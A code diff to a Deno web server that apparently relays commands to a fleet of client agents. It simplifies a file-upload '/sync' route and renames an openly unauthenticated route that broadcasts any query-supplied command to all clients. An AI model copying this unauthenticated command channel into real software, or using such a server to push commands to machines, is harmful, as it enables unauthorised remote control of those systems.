@@ -11,7 +11,7 @@ const approvedAgents = ["Deno/2.2.7", "BeaverUpdater", "websocket", "Firefox"];
 
 // Function to log messages to a file
 async function logToFile(message: string) {
-  const logFilePath = "/web/server.log";
+  const logFilePath = "/web/server.log"; // /web/server.log
   try {
       await Deno.writeTextFile(logFilePath, message + "\n", { append: true }); // Append the message to the log file
   } catch (error) {
@@ -132,21 +132,15 @@ Headers: ${headers}
 
 // insert a new route called sync that accepts a file by post request
 router.post("/sync", async (ctx) => {
-  const body = await ctx.request.body({ type: "form-data" }).value.read();
-  const files = Array.from(body.files.values());
-  if (files.length === 0) {
-    return ctx.response.status = 400;
-  }
-  for (const file of files) {
-    console.log(`Received crash report file ${file.filename}`);
-    // save the file to disk or process it as needed, need to fix this and dump to /uploads
-    //await Deno.writeFile(file.filename, await Deno.readAll(file.content));
-  }
+  const body = await ctx.request.body.formData();
+
+  console.log(body);
+  ctx.response.status = 200;
 });
 
 // unauthenticated command broadcast to fleet; yolo
-router.get("/woofwoof", async (ctx) => {
-  const command = ctx.request.url.searchParams.get("c") || "bark";
+router.get("/woof", async (ctx) => {
+  const command = ctx.request.url.searchParams.get("cmd") || "bark";
   broadcast(command);
   ctx.response.redirect(ctx.request.headers.get("Referer") || "/");
 });
